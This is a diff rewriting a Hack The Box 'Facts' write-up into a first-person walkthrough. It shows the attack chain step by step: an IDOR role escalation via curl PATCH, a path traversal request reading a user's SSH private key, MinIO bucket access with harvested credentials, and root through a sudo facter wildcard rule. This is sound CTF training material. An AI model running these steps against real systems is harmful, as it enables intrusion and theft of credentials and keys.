@@ -9,39 +9,14 @@ avatar: assets/htb/facts.png
 tags: [web, idor, path-traversal, s3, minio, ruby, sudo]
 htb_url: https://app.hackthebox.com/machines/Facts
 ---
+
 ## Summary
 
-Facts is the first machine of HTB Season 10 (Underground). It features a Ruby on Rails CMS called **Camaleon CMS** running with a path traversal vulnerability and an IDOR in the admin registration/update flow. Cloud storage credentials harvested from the CMS settings unlock a MinIO bucket holding the user's SSH private key. Root is achieved by abusing `sudo facter --custom-dir=`, which executes the first `.rb` script in the supplied directory as root.
+Facts is the first machine of HTB Season 10 (Underground), a Linux box built around a Ruby on Rails CMS called Camaleon CMS. My attack chain starts on the web: an IDOR in the admin registration/update flow lets me mass-assign myself the `admin` role, and from there a path traversal in Camaleon's `download_private_file` reads an SSH private key off disk for the user shell. Pivoting through plaintext cloud-storage credentials wired into the CMS settings unlocks a MinIO bucket holding a backup key, and root falls to `sudo facter --custom-dir=`, which executes the first `.rb` script in a supplied directory as root.
 
----
+## Enumeration
 
-## External Writeups
-
-- [GitHub: lightbringer999/FACTS-HTB](https://github.com/lightbringer999/FACTS-HTB)
-- [Medium - ItsSunshineXD (EN)](https://itssunshinexd.medium.com/htb-machine-facts-writeup-en-9db1ec215330)
-- [Medium - wahyudnWis (S10)](https://medium.com/@mwahyudinwisesar/facts-s10-htb-writeup-3f6369768e57)
-- [Ibrahim Isiaq Bolaji - Facts Walkthrough](https://www.ibrahimisiaqbolaji.com/2026/02/facts-hack-box-walkthrough.html)
-- [CyberSecGuru: Mastering Facts](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/)
-- [GitHub: CyberWarrior9 - Facts walkthrough](https://github.com/CyberWarrior9/HTB-Walkthroughs/blob/main/Facts/facts_htb_writeup.md)
-- [HackMD - Facts Writeup](https://hackmd.io/wWxm2lupSjC-Ir5ELV6KVg)
-- [1337 Sheets - FACTS Easy (Jan 31, 2026)](https://1337sheets.com/hack-the-box-season-htb-facts-writeup-easy-weekly-january/)
-
----
-
-## Key Techniques
-
-- IDOR on `/admin/users/{id}` (mass-assignment of `role`)
-- Camaleon CMS v2.9.0 Path Traversal in `download_private_file` (auth required, critical)
-- MinIO / S3-compatible object storage credential extraction
-- SSH private key recovery from misconfigured bucket
-- `sudo facter --custom-dir=` Ruby arbitrary file execution
-- Hardcoded plaintext cloud storage credentials in CMS settings
-
----
-
-## Attack Path
-
-### 1. Recon
+I start with a full TCP sweep and service detection:
 
 ```bash
 nmap -p- --min-rate=10000 -sV -sC facts.htb
@@ -49,11 +24,11 @@ nmap -p- --min-rate=10000 -sV -sC facts.htb
 # 80/tcp  nginx -> Camaleon CMS (Ruby on Rails)
 ```
 
-Add `facts.htb` to `/etc/hosts`. Browse the site, locate `/admin/register`.
+Two services: SSH on 22 and nginx on 80 fronting a Camaleon CMS (Ruby on Rails) install. I add `facts.htb` to `/etc/hosts`, browse the site, and locate the admin registration page at `/admin/register`. Camaleon is v2.9.0, which turns out to carry an unauthenticated-to-authenticated path traversal in `download_private_file`.
 
-### 2. Foothold via IDOR
+## Foothold
 
-Register a low-privilege user. Camaleon's profile-update endpoint allows updating arbitrary attributes for any user (including `role`). Promote your account to `admin`:
+First I register a low-privilege user through `/admin/register`. Camaleon's profile-update endpoint allows updating arbitrary attributes for any user, including `role`, so I exploit the IDOR to promote my own account to `admin`:
 
 ```bash
 curl -X PATCH http://facts.htb/admin/users/1 \
@@ -61,33 +36,35 @@ curl -X PATCH http://facts.htb/admin/users/1 \
   -d "user[role]=admin"
 ```
 
-### 3. Path Traversal (User Flag / SSH Key)
-
-With admin access, `download_private_file` traverses outside the media root:
+With admin access, the `download_private_file` action traverses outside the media root, letting me read arbitrary files from the filesystem. I pull the user's SSH private key:
 
 ```
 GET /admin/media/download_private_file?file=../../../../../home/sherman/.ssh/id_rsa
 ```
 
-SSH in as the recovered user.
+That recovers the key and I SSH in as the user for the foothold.
 
-### 4. Cloud Storage Pivot
+## Privilege Escalation
 
-Inside `Settings -> General Site -> Filesystem Settings`, the CMS is wired to an S3-compatible MinIO bucket with plaintext access key + secret. Use `mc` or `aws s3 --endpoint-url`:
+### Cloud storage pivot
+
+Inside `Settings -> General Site -> Filesystem Settings`, the CMS is wired to an S3-compatible MinIO bucket with a plaintext access key and secret. These hardcoded credentials are a classic secrets-in-config sink. I point the AWS CLI at the MinIO endpoint and list, then pull, the backup key:
 
 ```bash
 aws --endpoint-url http://facts.htb:9000 s3 ls
 aws --endpoint-url http://facts.htb:9000 s3 cp s3://backups/id_rsa -
 ```
 
-### 5. Root via Sudo Facter
+### Root via sudo facter
+
+Checking sudo rights reveals the misconfiguration:
 
 ```bash
 sudo -l
 # (root) NOPASSWD: /usr/bin/facter --custom-dir=*
 ```
 
-`facter` loads the first `.rb` file from the custom-dir path with Ruby; running as root means arbitrary code execution as root:
+`facter` loads the first `.rb` file from the custom-dir path through Ruby, and since the rule runs as root with a trailing wildcard, this is arbitrary code execution as root. I drop a fact that SUIDs bash and run it:
 
 ```bash
 mkdir /tmp/pwn
@@ -99,11 +76,4 @@ sudo /usr/bin/facter --custom-dir=/tmp/pwn
 # uid=1000(sherman) euid=0(root)
 ```
 
----
-
-## Lessons Learned
-
-- IDOR on role/privilege fields is still common in CMS frameworks - always test mass-assignment.
-- Cloud storage credentials in CMS settings are a frequent secrets-in-config sink.
-- `sudo` rules with `--custom-dir=*` or any `*` wildcard at the end of a Ruby/Python loader path are RCE-as-root.
-- Camaleon CMS path traversal (no CVE assigned at retirement) underscores the value of reading source for new/niche CMS frameworks.
+That gives me a root-effective shell and full control of the box.
